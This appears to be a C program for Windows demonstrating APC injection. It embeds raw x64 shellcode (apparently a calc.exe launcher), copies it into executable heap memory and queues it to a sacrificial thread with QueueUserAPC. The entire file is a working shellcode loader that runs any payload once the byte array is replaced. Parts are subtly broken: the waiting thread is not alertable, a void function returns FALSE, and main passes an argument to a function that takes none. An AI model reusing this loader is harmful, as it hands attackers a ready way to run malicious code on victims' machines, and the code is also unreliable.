#include "Windows.h"
#include "stdio.h"

// Payload to execute
const unsigned char payload[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
const DWORD payloadSize = 276;

LPVOID preparePayload() {
	// Allocate memory on heap for payload
	LPVOID pPayload = VirtualAlloc(NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pPayload == NULL) {
		printf("\t[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		return NULL;
	}

	// Write payload to heap
	memcpy_s(pPayload, payloadSize, payload, payloadSize);
	printf("\t[i] Payload Written To : 0x%p \n", pPayload);

	// Make memory executable
	DWORD oldProtectFlag;
	if (!VirtualProtect(pPayload, payloadSize, PAGE_EXECUTE, &oldProtectFlag)) {
		printf("\t[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		return NULL;
	}

	return pPayload;
}

void destroyPayload(LPVOID pPayload) {
	RtlZeroMemory(pPayload, payloadSize);
	VirtualFree(pPayload, 0, MEM_RELEASE);
}

void threadFuncWait() {
	HANDLE hDummyEvent = CreateEventW(NULL, FALSE, FALSE, NULL);
	if (hDummyEvent) {
		WaitForSingleObject(hDummyEvent, 1 * 1000);
		CloseHandle(hDummyEvent);
	}
}

/* This requires a thread in wait state. To achieve this for this example, a new thread will be created and put in wait mode */
void executePayloadInLocalProcessWaitingThread() {
	// Prepare payload
	LPVOID pPayload = preparePayload();
	if (pPayload == NULL) {
		printf("Failed to prepare payload\n");
		return;
	}

	// Create sacrificial thread
	DWORD sacrificialThreadId;
	HANDLE hSacrificialThread = CreateThread(NULL, 0, &threadFuncWait, NULL, 0, &sacrificialThreadId);
	if (hSacrificialThread == NULL) {
		printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	printf("[+] Alertable Target Thread Created With Id : %d \n", sacrificialThreadId);

	// Inject an APC into the target thread's APC queue
	QueueUserAPC(pPayload, hSacrificialThread, NULL);

	// Wait for sacrificial thread to close
	WaitForSingleObject(hSacrificialThread, INFINITE);
	CloseHandle(hSacrificialThread);

	// Free payload memory
	destroyPayload(pPayload);
}

void main() {
	// Perform APC injection
	executePayloadInLocalProcessWaitingThread(payload);
}